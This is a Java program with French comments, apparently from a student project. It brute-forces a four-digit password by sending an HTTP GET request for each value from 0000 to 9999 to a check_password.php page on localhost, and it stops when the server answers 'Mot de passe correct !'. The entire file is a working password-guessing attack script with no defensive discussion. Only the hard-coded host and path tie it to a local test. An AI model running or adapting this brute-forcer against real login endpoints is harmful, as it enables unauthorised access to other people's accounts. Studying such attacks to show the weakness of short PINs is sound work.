import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

public class PasswordCracker {
    public static void main(String[] args) {
        String serverHost = "localhost";
        int serverPort = 80;
        String password;

        // Boucle pour générer les différentes combinaisons de mots de passe
        for (int i = 0; i < 10000; i++) {
            password = String.format("%04d", i); // Formatage en 4 chiffres avec des zéros à gauche

            try (Socket socket = new Socket(serverHost, serverPort)) {
                OutputStream outputStream = socket.getOutputStream();

                // Former la requête HTTP GET avec le mot de passe
                String httpRequest = "GET /projet_HTTPS/check_password.php?password=" + password + " HTTP/1.1\r\n" +
                        "Host: " + serverHost + "\r\n" +
                        "Connection: close\r\n\r\n";

                // Envoyer la requête au serveur
                outputStream.write(httpRequest.getBytes());
                outputStream.flush();

                // Lire la réponse du serveur
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);

                    // Vérifier la réponse du serveur pour trouver le mot de passe
                    if (line.equals("Mot de passe correct !")) {
                        System.out.println("Mot de passe trouvé : " + password);
                        reader.close();
                        socket.close();
                        return; // Sortir de la boucle et de la méthode si le mot de passe est trouvé
                    }
                }

                // Fermer les flux et la socket
                outputStream.close();
                reader.close();
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
